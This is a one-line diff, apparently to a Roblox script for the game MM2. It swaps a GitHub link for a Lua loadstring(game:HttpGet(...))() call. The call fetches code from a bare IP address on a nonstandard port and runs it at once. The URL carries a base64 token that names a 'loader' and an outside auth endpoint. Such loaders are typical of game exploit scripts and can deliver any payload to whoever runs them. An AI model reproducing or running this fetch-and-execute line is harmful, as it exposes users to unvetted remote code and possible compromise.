@@ -1,1 +1,1 @@
-https://github.com/fvs-creator/FVS-mm2/blob/main/loader.lua
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjdkZmU2OTliLTc3OGYtNDljZC1hYjVlLTNhNTc3YmFjODBmOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL2FwaS5vdmVyZHJpdmVodWIueHl6L3YxL2F1dGgifX0"))()
